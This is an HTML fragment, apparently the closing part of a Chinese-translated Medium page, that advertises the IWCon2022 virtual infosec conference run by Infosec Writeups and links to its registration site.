ki kj kk ij bi translated">🔈🔈<strong class="jp ir"> Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。</strong> <a class="ae nj" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">查看更多详情，在此注册。</strong> </a></p><div class="lv lw gp gr lx ly"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">iwcon.live</p></div></div><div class="mh l"><div class="oe l mj mk ml mh mm lp ly"/></div></div></a></div></div></div>    
</body>
</html>